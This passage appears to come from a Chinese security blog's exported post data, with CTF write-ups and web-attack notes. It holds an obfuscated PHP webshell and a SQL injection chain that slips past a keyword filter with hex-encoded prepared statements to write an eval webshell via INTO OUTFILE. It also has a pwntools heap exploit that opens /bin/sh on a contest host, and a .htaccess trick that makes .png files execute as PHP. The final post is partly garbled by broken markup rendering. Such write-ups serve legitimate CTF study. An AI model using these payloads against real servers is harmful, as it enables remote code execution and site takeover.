class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$_=_==_;//1</span><br><span class=\"line\">$__=~一[$_];//G</span><br><span class=\"line\">$___=~了[$_];//E</span><br><span class=\"line\">$____=~端[$_];//T</span><br><span class=\"line\">$_=_.$__.$___.$____;//_GET</span><br><span class=\"line\">$_=$$_;//$_GET</span><br><span class=\"line\">$_[_]($_[__]);//$_GET[_]($_GET[__]);</span><br></pre></td></tr></table></figure>\n<h2 id=\"MultiSql\"><a href=\"#MultiSql\" class=\"headerlink\" title=\"MultiSql\"></a>MultiSql</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@@secure_file_priv           限制intofile可以写入的文件目录</span><br></pre></td></tr></table></figure>\n<p>waf.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tfunction waf($str)&#123;</span><br><span class=\"line\">\t\t$black_str = &quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;;</span><br><span class=\"line\">\t\t$str = preg_replace($black_str, &quot;@@&quot;,$str);</span><br><span class=\"line\">\t\treturn addslashes($str);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n<p>sql注入关键代码:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (isset($_SESSION[&apos;user_name&apos;])) &#123;</span><br><span class=\"line\">\tinclude_once(&apos;../header.php&apos;);</span><br><span class=\"line\">\tif (!isset($SESSION[&apos;user_id&apos;])) &#123;</span><br><span class=\"line\">\t\t$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&apos;&#123;$_SESSION[&apos;user_name&apos;]&#125;&apos;&quot;;</span><br><span class=\"line\">\techo $sql;\t\t</span><br><span class=\"line\">$data = mysqli_query($connect,$sql) or die(&apos;Mysql Error!!&apos;);</span><br><span class=\"line\">\t\t$result = mysqli_fetch_array($data);</span><br><span class=\"line\">\t\tvar_dump($result);</span><br><span class=\"line\">\t\t$_SESSION[&apos;user_id&apos;] = $result[&apos;DWVS_user_id&apos;];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t$html_avatar = htmlspecialchars($_SESSION[&apos;user_favicon&apos;]);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tif(isset($_GET[&apos;id&apos;]))&#123;</span><br><span class=\"line\">\t\t$id=waf($_GET[&apos;id&apos;]);</span><br><span class=\"line\">\t\t$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;.$id;</span><br><span class=\"line\">\t\t$data = mysqli_multi_query($connect,$sql) or die();</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$result = mysqli_store_result($connect);</span><br><span class=\"line\">\t\t$row = mysqli_fetch_row($result);</span><br><span class=\"line\">\t\techo &apos;&lt;h1&gt;user_id:&apos;.$row[0].&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;.$row[1].&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;.$row[4].&quot;&lt;/h3&gt;&quot;;</span><br><span class=\"line\">\t\tmysqli_free_result($result);</span><br><span class=\"line\">\t\tdie();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tmysqli_close($connect);</span><br></pre></td></tr></table></figure>\n<p>使用set跟hex编码的方式执行sql语句:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select user()                    =&gt;   0x73656c65637420757365722829</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set @num=0x73656c65637420757365722829;prepare t from @num;execute t;</span><br></pre></td></tr></table></figure>\n<p>写shell:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php eval($_REQUEST[&apos;55332&apos;]);?&gt;       =&gt;   0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile &apos;/var/www/html/favicon/wfox.php&apos;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<p>注册两个账号:</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?=$_GET[c];?&gt;                                        </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=$_GET[c];?&gt;'into outfile'/var/www/html/favicon/c1.php</span><br></pre></td></tr></table></figure>\n<p>这样，当使用第二个账号登录的时候:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&apos;&#123;$_SESSION[&apos;user_name&apos;]&#125;&apos;&quot;;</span><br><span class=\"line\">$sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&apos;&lt;?=$_GET[c];?&gt;&apos;into outfile&apos;/var/www/html/favicon/c1.php &apos; into outfile &apos;/var/www/html/favicon/c1.php&apos;;</span><br></pre></td></tr></table></figure>\n<p>就会将我们的shell写入账号。</p>\n<h1 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h1><h2 id=\"Note\"><a href=\"#Note\" class=\"headerlink\" title=\"Note\"></a>Note</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python2</span><br><span class=\"line\"></span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">from IPython import embed</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = &apos;amd64&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(&apos;pwn.suctf.asuri.org&apos;, 20003)</span><br><span class=\"line\"></span><br><span class=\"line\">def add(size, content):</span><br><span class=\"line\">    r.sendlineafter(&apos;&gt;&gt;&apos;, &apos;1&apos;)</span><br><span class=\"line\">    r.sendlineafter(&apos;Size:&apos;, str(size))</span><br><span class=\"line\">    r.sendlineafter(&apos;Content:&apos;, content)</span><br><span class=\"line\"></span><br><span class=\"line\">def show(idx):</span><br><span class=\"line\">    r.sendlineafter(&apos;&gt;&gt;&apos;, &apos;2&apos;)</span><br><span class=\"line\">    r.sendlineafter(&apos;Index:&apos;, str(idx))</span><br><span class=\"line\">    r.recvuntil(&apos;Content:&apos;)</span><br><span class=\"line\">    return r.recvuntil(&apos;1.Add a not&apos;, drop=True)</span><br><span class=\"line\"></span><br><span class=\"line\">def pandora():</span><br><span class=\"line\">    r.sendlineafter(&apos;&gt;&gt;&apos;, &apos;3&apos;)</span><br><span class=\"line\">    r.sendlineafter(&apos;yes:1)&apos;, &apos;1&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(10, &apos;a&apos;*24+flat(0xec1))</span><br><span class=\"line\">add(4000, &apos;a&apos;)</span><br><span class=\"line\">pandora()</span><br><span class=\"line\">x = show(0).strip()</span><br><span class=\"line\">heap = u64(x.ljust(8, &apos;\\x00&apos;)) - 0x140</span><br><span class=\"line\">print &apos;heap:&apos;, hex(heap)</span><br><span class=\"line\">add(0x90-8, &apos;a&apos;*7)</span><br><span class=\"line\">x = show(1).strip()</span><br><span class=\"line\">libc = u64(x.ljust(8, &apos;\\x00&apos;)) - 0x3bfb58</span><br><span class=\"line\">print &apos;libc:&apos;, hex(libc)</span><br><span class=\"line\"></span><br><span class=\"line\">#_IO_list_all = libc + 0x3c5520</span><br><span class=\"line\">_IO_list_all = libc + 0x3c0500</span><br><span class=\"line\">_IO_str_jumps = libc + 0x3bc4c0</span><br><span class=\"line\">#system = libc + 0x45390</span><br><span class=\"line\">system = libc + 0x456d0</span><br><span class=\"line\">pop_rax_rbx_rbp = libc + 0x1fa71</span><br><span class=\"line\">ret = libc + 0x1fa74</span><br><span class=\"line\">add(10, flat(</span><br><span class=\"line\">    &apos;a&apos;*16,</span><br><span class=\"line\">    0x0, 0x61,</span><br><span class=\"line\">    0, _IO_list_all-0x10,</span><br><span class=\"line\">    0, 1,</span><br><span class=\"line\">    0, heap+0x1a0, heap+0x1a0,      # buf_base to heap &amp; buf_end-buf_base==0</span><br><span class=\"line\">    [0]*18, _IO_str_jumps,</span><br><span class=\"line\">    ret, system,                    # malloc do nothing, free(buf_base) == system(&apos;/bin/sh&apos;)</span><br><span class=\"line\">    &apos;/bin/sh\\x00&apos;,</span><br><span class=\"line\">))</span><br><span class=\"line\"></span><br><span class=\"line\">#raw_input(&quot;@&quot;)</span><br><span class=\"line\">r.sendlineafter(&apos;&gt;&gt;&apos;, &apos;1&apos;)</span><br><span class=\"line\">r.sendlineafter(&apos;Size:&apos;, &apos;10&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">#embed()</span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure>"},{"title":"web安全备忘录","date":"2018-06-30T11:29:10.000Z","_content":"\n## dumpfile和outfile的区别\n\nSELECT into outfile: 导出到一个txt文件，可以导出每行记录的，这个很适合导库\n\nSELECT into dump: 只能导出一行数据\n\n如果想把一个可执行二进制文件用into outfile函数导出，导出后，文件会被破坏\n\n因为into outfile函数会在行末端写新行，更致使的是会转义换行符，这样2进制可执行文件就会被破坏\n\n这时，我们能用into dumpfile导出一个完整能执行的2进制文件，它不对任何列或行进行终止，也不执行任何转义处理\n\n总结：\n\ninto outfile:导出内容\n\ninto dumpfile:导出二进制文件\n\n## .htaccess\n\n```\nAddType application/x-httpd-php .png\nphp_flag engine 1\n```\n\nphp_flag 打开或者关闭PHP解析，本指令仅在使用PHP的Apache模块版本时才有用，可以基于目录或者虚拟主机来打开或者关闭PHP，将engine off放到httpd.conf文件中适当的位置就可以激活或者禁用PHP。\n\n","source":"_posts/web安全备忘录.md","raw":"---\ntitle: web安全备忘录\ndate: 2018-06-30 19:29:10\ntags:\n---\n\n## dumpfile和outfile的区别\n\nSELECT into outfile: 导出到一个txt文件，可以导出每行记录的，这个很适合导库\n\nSELECT into dump: 只能导出一行数据\n\n如果想把一个可执行二进制文件用into outfile函数导出，导出后，文件会被破坏\n\n因为into outfile函数会在行末端写新行，更致使的是会转义换行符，这样2进制可执行文件就会被破坏\n\n这时，我们能用into dumpfile导出一个完整能执行的2进制文件，它不对任何列或行进行终止，也不执行任何转义处理\n\n总结：\n\ninto outfile:导出内容\n\ninto dumpfile:导出二进制文件\n\n## .htaccess\n\n```\nAddType application/x-httpd-php .png\nphp_flag engine 1\n```\n\nphp_flag 打开或者关闭PHP解析，本指令仅在使用PHP的Apache模块版本时才有用，可以基于目录或者虚拟主机来打开或者关闭PHP，将engine off放到httpd.conf文件中适当的位置就可以激活或者禁用PHP。\n\n","slug":"web安全备忘录","published":1,"updated":"2018-07-30T03:35:40.477Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12in001sqkdlbm5fbrtm","content":"<h2 id=\"dumpfile和outfile的区别\"><a href=\"#dumpfile和outfile的区别\" class=\"headerlink\" title=\"dumpfile和outfile的区别\"></a>dumpfile和outfile的区别</h2><p>SELECT into outfile: 导出到一个txt文件，可以导出每行记录的，这个很适合导库</p>\n<p>SELECT into dump: 只能导出一行数据</p>\n<p>如果想把一个可执行二进制文件用into outfile函数导出，导出后，文件会被破坏</p>\n<p>因为into outfile函数会在行末端写新行，更致使的是会转义换行符，这样2进制可执行文件就会被破坏</p>\n<p>这时，我们能用into dumpfile导出一个完整能执行的2进制文件，它不对任何列或行进行终止，也不执行任何转义处理</p>\n<p>总结：</p>\n<p>into outfile:导出内容</p>\n<p>into dumpfile:导出二进制文件</p>\n<h2 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AddType application/x-httpd-php .png</span><br><span class=\"line\">php_flag engine 1</span><br></pre></td></tr></table></figure>\n<p>php_flag 打开或者关闭PHP解析，本指令仅在使用PHP的Apache模块版本时才有用，可以基于目录或者虚拟主机来打开或者关闭PHP，将engine off放到httpd.conf文件中适当的位置就可以激活或者禁用PHP。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"dumpfile和outfile的区别\"><a href=\"#dumpfile和outfile的区别\" class=\"headerlink\" title=\"dumpfile和outfile的区别\"></a>dumpfile和outfile的区别</h2><p>SELECT into outfile: 导出到一个txt文件，可以导出每行记录的，这个很适合导库</p>\n<p>SELECT into dump: 只能导出一行数据</p>\n<p>如果想把一个可执行二进制文件用into outfile函数导出，导出后，文件会被破坏</p>\n<p>因为into outfile函数会在行末端写新行，更致使的是会转义换行符，这样2进制可执行文件就会被破坏</p>\n<p>这时，我们能用into dumpfile导出一个完整能执行的2进制文件，它不对任何列或行进行终止，也不执行任何转义处理</p>\n<p>总结：</p>\n<p>into outfile:导出内容</p>\n<p>into dumpfile:导出二进制文件</p>\n<h2 id=\"htaccess\"><a href=\"#htaccess\" class=\"headerlink\" title=\".htaccess\"></a>.htaccess</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AddType application/x-httpd-php .png</span><br><span class=\"line\">php_flag engine 1</span><br></pre></td></tr></table></figure>\n<p>php_flag 打开或者关闭PHP解析，本指令仅在使用PHP的Apache模块版本时才有用，可以基于目录或者虚拟主机来打开或者关闭PHP，将engine off放到httpd.conf文件中适当的位置就可以激活或者禁用PHP。</p>\n"},{"title":"url相对路径和绝对路径","date":"2018-03-27T01:53:14.000Z","_content":"jquery.min.js的绝对路径:\n\n```\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n```\n\n##### 当前url: http://39.107.33.96:20000/index.php/view/\n\nhtml中引入jquery.min.js,相对路径:\n```\n<script src=\"../static/js/jquery.min.js\"></script>\n```   \n\n此时: 浏览器解析js的路径:  \n```\nhttp://39.107.33.96:20000/index.php/static/js/jquery.min.js  找不到\n```\n\n\n##### 当前url: http://39.107.33.96:20000/index.php/view\n\nhtml中引入jquery.min.js，采用相对路径:\n```\n<script src=\"../static/js/jquery.min.js\"></script>\n```   \n\n此时: js的路径:   http://39.107.33.96:20000/static/js/jquery.min.js 可以找到\n\n#### 注意:http://39.107.33.96:20000/index.php/view/article/1152 可访问\n\n##### 当前url: http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php\n\n对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。\n也就是访问\n\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php\n=>\nhttp://39.107.33.96:20000/index.php\n```\n\n浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为\n..%2f..%2f..%2f..%2findex.php这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。\n就好比输入url-https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递\n\njs的路径：\n\n```\n<script src=\"/static/js/jquery.min.js\"></script>\n解析之后:\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n```\n\n```\n<script src=\"static/js/jquery.min.js\"></script>\n解析之后:\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n```\n\n采用相对路径引入js:\n当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，\n\n读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是http://39.107.33.96:20000/index.php/view/article/1152\n也就是url:\n\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n```\n返回的内容就是:\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152\n```\n中返回的内容\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/url相对路径和绝对路径.md","raw":"---\ntitle: url相对路径和绝对路径\ndate: 2018-03-27 09:53:14\ntags:\n- 前端\n---\njquery.min.js的绝对路径:\n\n```\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n```\n\n##### 当前url: http://39.107.33.96:20000/index.php/view/\n\nhtml中引入jquery.min.js,相对路径:\n```\n<script src=\"../static/js/jquery.min.js\"></script>\n```   \n\n此时: 浏览器解析js的路径:  \n```\nhttp://39.107.33.96:20000/index.php/static/js/jquery.min.js  找不到\n```\n\n\n##### 当前url: http://39.107.33.96:20000/index.php/view\n\nhtml中引入jquery.min.js，采用相对路径:\n```\n<script src=\"../static/js/jquery.min.js\"></script>\n```   \n\n此时: js的路径:   http://39.107.33.96:20000/static/js/jquery.min.js 可以找到\n\n#### 注意:http://39.107.33.96:20000/index.php/view/article/1152 可访问\n\n##### 当前url: http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php\n\n对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。\n也就是访问\n\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php\n=>\nhttp://39.107.33.96:20000/index.php\n```\n\n浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为\n..%2f..%2f..%2f..%2findex.php这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。\n就好比输入url-https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递\n\njs的路径：\n\n```\n<script src=\"/static/js/jquery.min.js\"></script>\n解析之后:\nhttp://39.107.33.96:20000/static/js/jquery.min.js\n```\n\n```\n<script src=\"static/js/jquery.min.js\"></script>\n解析之后:\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n```\n\n采用相对路径引入js:\n当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，\n\n读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是http://39.107.33.96:20000/index.php/view/article/1152\n也就是url:\n\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\n```\n返回的内容就是:\n```\nhttp://39.107.33.96:20000/index.php/view/article/1152\n```\n中返回的内容\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"url相对路径和绝对路径","published":1,"updated":"2018-03-30T09:40:37.683Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkia12ir001vqkdl3lv8yokq","content":"<p>jquery.min.js的绝对路径:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://39.107.33.96:20000/static/js/jquery.min.js</span><br></pre></td></tr></table></figure>\n<h5 id=\"当前url-http-39-107-33-96-20000-index-php-view\"><a href=\"#当前url-http-39-107-33-96-20000-index-php-view\" class=\"headerlink\" title=\"当前url: http://39.107.33.96:20000/index.php/view/\"></a>当前url: <a href=\"http://39.107.33.96:20000/index.php/view/\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/</a></h5><p>html中引入jquery.min.js,相对路径:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">```   </span><br><span class=\"line\"></span><br><span class=\"line\">此时: 浏览器解析js的路径:</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://39.107.33.96:20000/index.php/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/static/js/jquery.min.js</a>  找不到<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">##### 当前url: http://39.107.33.96:20000/index.php/view</span><br><span class=\"line\"></span><br><span class=\"line\">html中引入jquery.min.js，采用相对路径:</span><br></pre></td></tr></table></figure></p>\n<p><script src=\"../static/js/jquery.min.js\"></script><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">此时: js的路径:   http://39.107.33.96:20000/static/js/jquery.min.js 可以找到</span><br><span class=\"line\"></span><br><span class=\"line\">#### 注意:http://39.107.33.96:20000/index.php/view/article/1152 可访问</span><br><span class=\"line\"></span><br><span class=\"line\">##### 当前url: http://39.107.33.96:20000/index.php/view/article/1152/..%2f..%2f..%2f..%2findex.php</span><br><span class=\"line\"></span><br><span class=\"line\">对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。</span><br><span class=\"line\">也就是访问</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152/../../../../index.php</a><br>=&gt;<br><a href=\"http://39.107.33.96:20000/index.php\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为</span><br><span class=\"line\">..%2f..%2f..%2f..%2findex.php这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。</span><br><span class=\"line\">就好比输入url-https://www.baidu.com?id=1，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递</span><br><span class=\"line\"></span><br><span class=\"line\">js的路径：</span><br></pre></td></tr></table></figure></p>\n<p><script src=\"/static/js/jquery.min.js\"></script><br>解析之后:<br><a href=\"http://39.107.33.96:20000/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/static/js/jquery.min.js</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p><script src=\"static/js/jquery.min.js\"></script><br>解析之后:<br><a href=\"http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">采用相对路径引入js:</span><br><span class=\"line\">当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</span><br><span class=\"line\"></span><br><span class=\"line\">读到..%2f..%2f..%2f..%2findex.php这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是http://39.107.33.96:20000/index.php/view/article/1152</span><br><span class=\"line\">也就是url:</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152/static/js/jquery.min.js</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">返回的内容就是:</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://39.107.33.96:20000/index.php/view/article/1152\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/article/1152</a><br><code>`</code><br>中返回的内容</p>\n","site":{"data":{}},"excerpt":"","more":"<p>jquery.min.js的绝对路径:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://39.107.33.96:20000/static/js/jquery.min.js</span><br></pre></td></tr></table></figure>\n<h5 id=\"当前url-http-39-107-33-96-20000-index-php-view\"><a href=\"#当前url-http-39-107-33-96-20000-index-php-view\" class=\"headerlink\" title=\"当前url: http://39.107.33.96:20000/index.php/view/\"></a>当前url: <a href=\"http://39.107.33.96:20000/index.php/view/\" target=\"_blank\" rel=\"noopener\">http://39.107.33.96:20000/index.php/view/</a></h5><p>html中引入jquery.min.js,相对路径:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=&quot;../static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">```   </span><br><span class=\"line\"></span><br><span class=\"line\">此时: 浏览器解析js的路径:</span><br></pre></td></tr></table></figure></p>\n<p><a 